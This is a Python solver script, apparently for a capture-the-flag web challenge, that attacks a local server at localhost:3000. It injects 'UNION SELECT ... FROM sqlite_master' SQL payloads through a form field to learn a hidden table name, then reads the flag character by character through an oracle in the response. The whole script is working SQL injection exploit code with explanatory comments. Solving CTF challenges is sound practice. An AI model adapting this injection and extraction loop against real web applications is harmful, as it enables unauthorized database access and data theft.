import requests
import string
import re
url = "http://localhost:3000/" # INSERT URL HERE WHEN NOT DOING LOCALLY
bank = string.ascii_uppercase + string.digits
bank2 = string.ascii_letters + string.digits + "_}{"
# First we need to get the name of the flag table
# We can use SQL injection to get rndAns to be the name of the flag table 
# Since it tells us at what position our guess differs, we can find the flag one char at a time.
pos = 4
flagTable = "flagAAAAAAAAAAAAAUNIONSELECTnameASwordFROMsqlitemaster"
while pos < 17:
    for c in bank:
        if pos == 17: # we are done
            break
        flagTable = flagTable[:pos] + c + flagTable[pos+1:]
        # this works as a sql injection since the ???s are all in a string that's useless
        # and it passes the regex thanks to adding the text to the end of flagTable (and putting ????s at the start of the sql)
        r = requests.post(url, data={"ptrn": "?????????????????' UNION SELECT name AS word FROM sqlite_master --", "word": flagTable})
        if "HUHH WHAT" in r.text:
            print(flagTable)
            pos = 17
            break
        newPos = int(re.findall("CHAR ([0-9]+)</h3>",r.text)[0])
        if pos != newPos:
            pos = newPos
            print(pos, flagTable)
            break

flagTable = flagTable[:17] # remove the UNIONSELECT stuff
# Now we can get the flag with the same tactic
flag = "bcactf{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
pos = 0
while True:
    for c in bank2:
        flag = flag[:pos] + c + flag[pos+1:]
        r = requests.post(url, data={"ptrn": f"{'?'*len(flag)}' UNION SELECT flag AS word FROM {flagTable} --)*", "word": flag+f"UNIONSELECTflagASwordFROM{re.sub('[^A-Za-z]','',flagTable)}"})
        if "HUHH WHAT" in r.text:
            print(flag)
            break
        newPos = int(re.findall("CHAR ([0-9]+)</h3>",r.text)[0])
        if pos != newPos:
            pos = newPos
            print(pos, flag)
            break
    if flag.find("}") > -1:
        print(flag)
        break


